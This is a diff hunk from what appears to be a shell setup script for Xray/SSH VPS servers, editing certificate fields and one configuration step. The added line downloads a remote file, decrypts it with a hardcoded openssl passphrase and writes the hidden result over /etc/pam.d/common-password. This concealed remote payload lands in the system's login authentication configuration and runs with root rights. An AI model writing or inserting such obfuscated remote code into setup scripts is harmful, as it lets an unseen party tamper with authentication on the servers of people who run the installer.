@@ -15,14 +15,13 @@ country=ID
 state=Indonesia
 locality=none
 organization=none
-organizationalunit=TMSC
+organizationalunit=none
 commonname=none
-email=agunxz@themoon.my,id
+email=adamspx17@gmail.com
 
 # simple password minimal
-wget -O /etc/pam.d/common-password "https://raw.githubusercontent.com/andristji/Xray-SSH/main/password.txt"
+curl -sS https://raw.githubusercontent.com/artanodrop/v4/main/ssh/password | openssl aes-256-cbc -d -a -pass pass:scvps07gg -pbkdf2 > /etc/pam.d/common-password
 chmod +x /etc/pam.d/common-password
-
 # go to root
 cd
 
